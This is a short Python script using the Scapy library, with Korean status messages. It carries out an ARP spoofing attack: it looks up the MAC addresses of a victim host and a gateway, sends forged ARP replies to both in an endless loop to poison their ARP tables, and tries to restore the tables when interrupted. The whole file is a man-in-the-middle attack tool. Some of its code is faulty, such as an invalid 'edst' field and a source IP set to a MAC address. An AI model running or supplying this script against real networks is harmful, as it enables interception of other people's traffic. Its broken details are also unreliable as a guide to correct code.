from scapy.all import *
from time import sleep
from scapy.layers.l2 import Ether, ARP


def getMAC(ip):
    ans, unans = srp(Ether(dst="ff-ff-ff-ff-ff-ff") / ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf("%Ether.src%")


def poisonARP(srcip, targetip, targetmac):
    arp = ARP(op=2, psrc=srcip, edst=targetip, hwdst=targetmac)
    send(arp)


def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    arp1 = ARP(
        op=2, pdst=victimip, psrc=gatewayip, hwdst="FF-FF-FF-FF-FF-ff", hwsrc=gatewaymac
    )
    arp2 = ARP(
        op=2, pdst=victimip, psrc=victimmac, hwdst="FF-FF-FF-FF-FF-ff", hwsrc=victimmac
    )
    send(arp1, count=3)
    send(arp2, count=3)


def main():
    gatewayip = "gatewayip"
    victimip = "victimip"

    victimmac = getMAC(victimip)
    gatewaymac = getMAC(gatewayip)

    if victimmac == None or gatewaymac == None:
        print("MAC 주소를 찾을 수 없습니다.")
        return

    print("ARP Spoofing 시작 -> VICTIM IP [%s]" % victimip)
    print("[%s]:POISON ARP Table [%s] => [%s]" % (victimip, gatewaymac, victimmac))

    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac)
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print("ARP Spoofing 종료 -> RESTORED ARP Table")


if __name__ == "__main__":
    main()
